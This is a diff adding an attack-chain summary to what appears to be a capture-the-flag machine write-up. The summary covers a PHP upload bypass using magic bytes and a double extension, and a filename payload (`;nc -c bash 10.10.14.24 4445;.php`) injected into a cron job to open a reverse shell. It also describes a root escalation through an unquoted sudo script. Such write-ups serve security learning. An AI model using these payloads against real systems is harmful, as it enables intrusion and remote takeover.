@@ -4,6 +4,17 @@ Difficulty: Easy
 Operating System: Linux
 Hints: True
 ```
+
+### 🏁 Summary of Attack Chain
+
+| Step | User / Access | Technique Used | Result |
+|:---|:---|:---|:---|
+| 1 | `apache` | Unrestricted File Upload & PHP RCE | Discovered an upload form on the website. Analyzed the application's source code from a `backup.tar` file, which revealed file validation weaknesses. By including `GIF8` magic bytes and using a `.php.gif` file extension, I bypassed mime type and extension checks. This misconfiguration, which allowed the web server to execute `.php.*` files as PHP scripts, led to Remote Code Execution (RCE) and a shell as the `apache` user. |
+| 2 | `guly` | Cron Job Manipulation & Command Injection | Enumerated the system as `apache` and found a cron job running a PHP script (`check_attack.php`) as the user `guly`. The script checked for improperly named files in the `/uploads/` directory and used `exec()` to delete them. By creating a file named with a command injection payload (`;nc -c bash 10.10.14.24 4445;.php`), I was able to inject and execute a command as `guly` when the cron job ran, gaining a shell as the `guly` user. |
+| 3 | `root` | Sudo Misconfiguration & Path Injection | Discovered that the user `guly` could run `/usr/local/sbin/changename.sh` as `root` without a password. Analyzing the script showed that it took user input and echoed it to a file without proper quoting. By providing `test bash` as input for one of the variables, the `echo` command executed `bash` with root privileges, granting a root shell. |
+
+
+
 ## Initial Enumeration
 Running nmap scan (TCP) on the target shows the following results:
 ```
